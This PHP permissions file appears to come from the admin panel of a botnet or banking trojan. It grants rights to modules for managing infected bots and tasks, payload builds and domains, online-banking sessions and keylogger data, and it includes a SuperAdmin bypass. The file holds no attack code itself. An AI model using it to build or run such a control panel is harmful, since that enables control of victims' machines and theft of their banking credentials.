<?php

$right['main']['index'] = true;
$right['main']['edit'] = true;
$right['main']['info'] = true;
$right['main']['stat'] = true;
$right['main']['clear_bots'] = true;
$right['main']['clear_process'] = true;
$right['main']['clear_search'] = true;
$right['main']['clear_all'] = true;

$right['accounts']['index'] = true;
$right['accounts']['list'] = true;
$right['accounts']['create'] = true;
$right['accounts']['edit'] = true;
$right['accounts']['edits'] = true;
$right['accounts']['delete'] = true;
$right['accounts']['profile'] = true;
$right['accounts']['profiles'] = true;
$right['accounts']['enableanddisable'] = true;
$right['accounts']['rights'] = true;
$right['accounts']['right'] = true;
$right['accounts']['settings'] = true;
$right['accounts']['setting'] = true;

$right['settings']['index'] = true;

$right['ampie']['index'] = true;
$right['ampie']['bots_all'] = true;
$right['ampie']['bots_live'] = true;
$right['ampie']['procces'] = true;
$right['ampie']['antivir'] = true;
$right['ampie']['os'] = true;
$right['ampie']['rights'] = true;

$right['bots']['index'] = true;
$right['bots']['bot'] = true;
$right['bots']['country'] = true;
$right['bots']['search'] = true;
$right['bots']['filter_country_list'] = true;
$right['bots']['filter_country'] = true;
$right['bots']['task_add'] = true;
$right['bots']['delete_bot'] = true;
$right['bots']['delete_country'] = true;
$right['bots']['tracking'] = true;
$right['bots']['jobs'] = true;
$right['bots']['jobs_add'] = true;
$right['bots']['jobs_edit'] = true;
$right['bots']['jobs_designer'] = true;
$right['bots']['config'] = true;
$right['bots']['jobs_bot_edit'] = true;
$right['bots']['links'] = true;
$right['bots']['save_comment'] = true;
$right['bots']['pgt'] = true;
$right['bots']['p2p'] = true;
$right['bots']['p2p_config'] = true;

$right['autosys']['index'] = true;
$right['autosys']['domains'] = true;
$right['autosys']['domains_add'] = true;
$right['autosys']['domains_del'] = true;
$right['autosys']['builds'] = true;
$right['autosys']['builds_add'] = true;
$right['autosys']['builds_edit'] = true;
$right['autosys']['builds_del'] = true;

$right['ibank']['index'] = true;
$right['ibank']['bot'] = true;
$right['ibank']['crt'] = true;
$right['ibank']['save_comment'] = true;
$right['ibank']['delete'] = true;

$right['logs']['index'] = true;
$right['logs']['show'] = true;
$right['logs']['download'] = true;
$right['logs']['save_comment'] = true;
$right['logs']['screen'] = true;

$right['cabs']['index'] = true;
$right['cabs']['screens'] = true;
$right['cabs']['rscreens'] = true;
$right['cabs']['delete_list'] = true;
$right['cabs']['cab_view'] = true;
$right['cabs']['sclear'] = true;
$right['cabs']['ibank'] = true;

$right['filters']['index'] = true;
$right['filters']['edit'] = true;
$right['filters']['add_sub'] = true;
$right['filters']['add_filter'] = true;
$right['filters']['edit_sub'] = true;
$right['filters']['edit_filter'] = true;
$right['filters']['remove'] = true;
$right['filters']['logs'] = true;
$right['filters']['logs_static'] = true;
$right['filters']['delete'] = true;
$right['filters']['show'] = true;
$right['filters']['search'] = true;
$right['filters']['download'] = true;
$right['filters']['unnecessary'] = true;
$right['filters']['unnecessary_download'] = true;
$right['filters']['savelog'] = true;
$right['filters']['savelog_download'] = true;

$right['keylog']['index'] = true;
$right['keylog']['prog_add'] = true;
$right['keylog']['prog_edit'] = true;
$right['keylog']['prog_del'] = true;
$right['keylog']['hash'] = true;
$right['keylog']['save_comment'] = true;
$right['keylog']['show'] = true;
$right['keylog']['item_del'] = true;

//$right['backup']['download'] = true;
if($_SESSION['hidden'] != 'on' && $_SESSION['user']->login != 'SuperAdmin'){	foreach($right as $key => $value){		if(!file_exists('modules/'.$key.'/')) unset($right[$key]);
	}
}

?>